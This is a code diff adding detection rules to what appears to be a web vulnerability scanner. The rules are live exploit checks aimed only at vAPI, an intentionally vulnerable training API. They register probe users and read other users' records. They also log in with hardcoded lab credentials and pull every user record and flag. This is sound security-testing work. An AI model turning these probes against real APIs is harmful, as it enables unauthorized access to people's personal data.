@@ -37064,6 +37064,91 @@ function isVapiHost(ctx: RuleContext): boolean {
   return /vapi\.apisec\.ai/i.test(ctx.origin);
 }
 
+const vapiApi1BolaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_api1_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api1/user", ctx.origin).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const idMatch = createDoc.body.match(/"id"\s*:\s*(\d+)/);
+  if (!idMatch) return NEGATIVE;
+  const ownId = Number(idMatch[1]);
+  const token = vapiBasicAuthToken(username, password);
+  const bolaUrl = new URL("/vapi/api1/user/1", ctx.origin).toString();
+  const bolaDoc = await ctx.probe.get(bolaUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (bolaDoc.status < 200 || bolaDoc.status >= 400) return NEGATIVE;
+  const flagMatch = bolaDoc.body.match(/flag\{api1_[^"]+/i);
+  const otherUser =
+    /"id"\s*:\s*1/.test(bolaDoc.body) && /"username"\s*:/.test(bolaDoc.body) && ownId !== 1;
+  if (!flagMatch && !otherUser) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      createUrl,
+      bolaUrl,
+      ownId,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: bolaDoc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api1/user/1 with newly registered user token returns user id=1 record including flag — BOLA oracle (API1)"
+    }
+  };
+};
+
+const VAPI_API2_KNOWN_EMAIL = "savanna48@ortiz.com";
+const VAPI_API2_KNOWN_PASSWORD = "zTyBwV/9";
+
+const vapiApi2BrokenAuthLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/vapi/api2/user/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: VAPI_API2_KNOWN_EMAIL, password: VAPI_API2_KNOWN_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
+  const tokenMatch = loginDoc.body.match(/"token"\s*:\s*"([^"]{8,})"/);
+  if (!tokenMatch) return NEGATIVE;
+  const detailsUrl = new URL("/vapi/api2/user/details", ctx.origin).toString();
+  const detailsDoc = await ctx.probe.get(detailsUrl, {
+    headers: { "Authorization-Token": tokenMatch[1] },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (detailsDoc.status < 200 || detailsDoc.status >= 400) return NEGATIVE;
+  if (!/\[\s*\{/.test(detailsDoc.body) || !/"email"\s*:/.test(detailsDoc.body)) return NEGATIVE;
+  const flagMatch = detailsDoc.body.match(/flag\{api2_[^"]+/i);
+  const rowCount = (detailsDoc.body.match(/"id"\s*:/g) || []).length;
+  if (rowCount < 2 && !flagMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      loginUrl,
+      detailsUrl,
+      knownEmail: VAPI_API2_KNOWN_EMAIL,
+      rowCount,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: detailsDoc.body.slice(0, 200).trim(),
+      note: "vAPI POST /api2/user/login accepts credential-stuffing creds and GET /api2/user/details returns every user record including flag — broken authentication oracle (API2)"
+    }
+  };
+};
+
 const vapiApi3CommentBolaLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const commentUrl = new URL("/vapi/api3/comment", ctx.origin).toString();
@@ -37190,6 +37275,23 @@ const vapiApi5BflaLiveOracle: Rule = async (ctx) => {
       flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
       rowCount: (usersDoc.body.match(/"id"\s*:/g) || []).length,
       note: "vAPI GET /api5/users with regular-user Authorization-Token returns every user record including admin flag — broken function level authorization oracle (API5)"
+    }
+  };
+};
+
+const vapiApi6RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api6\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi6MassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api6/user route scan — POST credit inflation and GET /api6/user/me returns flag — mass assignment oracle (API6)"
     }
   };
 };
@@ -38973,11 +39075,14 @@ export const RULES: Record<string, Rule> = {
   xxeXmlPostProbe,
   clientSideCssInjectionEvidence,
   clientSideVapiEvidence,
+  vapiApi1BolaLiveOracle,
+  vapiApi2BrokenAuthLiveOracle,
   vapiApi3CommentBolaLiveOracle,
   vapiApi4OtpBrokenAuthLiveOracle,
   vapiApi4UserExposureLiveOracle,
   vapiApi5BflaLiveOracle,
   vapiApi6MassAssignmentLiveOracle,
+  vapiApi6RouteLiveOracle,
   vapiApi8SqliLoginLiveOracle,
   vapiApi7CorsMisconfigLiveOracle,
   istEduSearchXssRouteLiveOracle,
